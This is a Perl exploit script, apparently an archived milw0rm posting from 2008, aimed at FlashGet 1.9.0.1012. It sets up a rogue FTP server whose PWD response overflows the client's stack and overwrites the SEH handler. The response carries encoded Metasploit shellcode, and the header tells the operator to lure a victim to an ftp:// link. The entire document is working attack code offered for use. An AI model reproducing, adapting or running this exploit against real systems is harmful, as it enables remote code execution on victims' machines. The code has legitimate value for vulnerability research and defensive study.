#!/usr/bin/perl
# FlashGet 1.9.0.1012 (FTP PWD Response) SEH STACK Overflow Exploit
# Coded By SkOd, skod.uk at gmail dot com
# Tested over Windows XP sp1 Hebrew
# link your victim to - ftp://localhost/somefile.TORRENT - over internet explorer.

##
# PoC by Krystian Kloskowski (h07) <h07@interia.pl>
# http://milw0rm.com/exploits/6240

##
# special thanks to a friend of mine who helped me

use IO::Socket;

####################################[ Parameters ]########################################
my $SHELLCODE =
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6b".
"\xa3\x03\x10\x83\xeb\xfc\xe2\xf4\x97\x4b\x47\x10\x6b\xa3\x88\x55".
"\x57\x28\x7f\x15\x13\xa2\xec\x9b\x24\xbb\x88\x4f\x4b\xa2\xe8\x59".
"\xe0\x97\x88\x11\x85\x92\xc3\x89\xc7\x27\xc3\x64\x6c\x62\xc9\x1d".
"\x6a\x61\xe8\xe4\x50\xf7\x27\x14\x1e\x46\x88\x4f\x4f\xa2\xe8\x76".
"\xe0\xaf\x48\x9b\x34\xbf\x02\xfb\xe0\xbf\x88\x11\x80\x2a\x5f\x34".
"\x6f\x60\x32\xd0\x0f\x28\x43\x20\xee\x63\x7b\x1c\xe0\xe3\x0f\x9b".
"\x1b\xbf\xae\x9b\x03\xab\xe8\x19\xe0\x23\xb3\x10\x6b\xa3\x88\x78".
"\x57\xfc\x32\xe6\x0b\xf5\x8a\xe8\xe8\x63\x78\x40\x03\x53\x89\x14".
"\x34\xcb\x9b\xee\xe1\xad\x54\xef\x8c\xc0\x62\x7c\x08\xa3\x03\x10";
# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com

# The Host that will be listen to the Download request from Flashget
my $HOST = '127.0.0.1'; #your own ip
#################################[Don't Edit From Here]#####################################


######################################[Defines]#############################################
my $PADDING_CHAR = "A";
my $PADDING_SIZE = 324;

#The code will return to next_seh_chain so i make it as jump and invalid address
#so it will be decoded as last in chain.
my $NEXT_SEH_IN_CHAIN = "\xEB\x06\xFF\xFF"; # JMP +6

#Settings Return Address
my $CUR_SEH_ADDRESS = "\x8B\x19\x01\x10"; 
# Chosen Ret Addr is : 0x1001198B FlashGet\FGBTCORE.dll v1.0. 0.36
# 1001198B   5E               POP ESI
# 1001198C   5B               POP EBX
# 1001198D   C3               RETN

# Building SEH Block
my $SEH_BLOCK = $NEXT_SEH_IN_CHAIN . 
				$CUR_SEH_ADDRESS;

#Creating Payload
$PAYLOAD  = $PADDING_CHAR x $PADDING_SIZE;		
$PAYLOAD .= $SEH_BLOCK;
$PAYLOAD .= $SHELLCODE;
$PAYLOAD .= "\x90" x 300;	#Putting alot of nops so the code will get Exception that we write after stack is over
							#witch will make it to call our code

$LISTEN_PORT = 21;
##########################################################################
print "# FlashGet 1.9.0.1012 (FTP PWD Response) SEH STACK Overflow Exploit\r\n";
print "# Coded By SkOd, skod.uk\x40gmail\x2ecom\r\n";

my $serverSocket = new IO::Socket::INET (Listen => 1,
					LocalAddr => $HOST,
					LocalPort => $LISTEN_PORT,
					Proto     => 'tcp');	
do
{
	print "\r\n[~] listening...\r\n";
	$clientSocket = $serverSocket->accept();
	print "[+] New Connection Recived\r\n";

	$clientSocket->send("220 WELCOME!\r\n");
	$isPayloadSent = 0;
	
	while($isPayloadSent == 0) {
		$clientSocket->recv($recvBuffer,1024);
			print "[~] Recived: " . $recvBuffer;
	
		if($recvBuffer =~ /USER/) {
			$clientSocket->send("331 Password required for l33t\r\n");
		} elsif($recvBuffer =~ /PASS/) {
			$clientSocket->send("230 User l33t logged in.\r\n");
		} else {
			$clientSocket->send("257 \"$PAYLOAD\"\r\n");
			print("[+] The payload has been sent...\r\n");
			$isPayloadSent = 1;
		}
	}
	
	$clientSocket->close();
	
} while (true);

# milw0rm.com [2008-08-15]
